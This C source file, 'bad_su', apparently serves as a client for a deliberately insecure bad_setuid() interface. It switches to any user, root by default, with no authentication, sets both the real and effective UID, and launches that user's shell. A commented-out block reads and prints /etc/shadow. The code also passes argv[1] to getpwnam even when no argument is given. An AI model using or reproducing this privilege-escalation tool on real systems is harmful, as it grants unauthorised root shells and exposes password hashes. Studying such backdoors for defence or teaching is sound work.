#include <stdio.h>
#include <errno.h>
#include <string.h>

#include <pwd.h>

#include <bad_setuid.h>

int main(int argc, char** argv)
{
	if (argc > 2) {

		printf("Usage:\n\tbad_su <user>\nIf <user> is not given, root is assumed.\n");
		return 1;
	}

	const char* username = argc == 2 ? argv[1] : "root";
	errno = 0;
	const struct passwd* user_info = getpwnam(argv[1]);

	if (!user_info) {

		printf("Failed to uid for username: %s\n", argv[1]);
		goto error;
	}

	const uid_t new_uid = user_info->pw_uid;

	printf("Trying to change user to %s with UID %d!\n", username, new_uid);

	int result = bad_setuid(new_uid);

	if (result == 0) {
		printf("Changed effective user! Effective UID is now: %d\n", geteuid());	
	} else {

		printf("Failed to change effective user!\n");
		goto error;
	}

	errno = 0;
	result = setreuid(new_uid, new_uid);

	if (result == 0) {
		printf("Changed real user! Real UID is now: %d\n", getuid());	
	} else {

		printf("Failed to change real user!\n");
		errno = -result;
		goto error;
	}

	/* errno = 0; */
	/* FILE* file = fopen("/etc/shadow", "r"); */
	/* if (!file) goto error; */
	/* char buffer[80]; */
	/* int size_read = fread(&buffer, 79, 1, file); */ 
	/* printf("%s\n", buffer); */

	printf("Starting shell...\n");
	char* args[] = { user_info->pw_shell, NULL };
	execv(user_info->pw_shell, args);

	printf("Shell execution failed!");
error:
	printf("\tDue to: %s\n", strerror(errno));
	return 1;
}
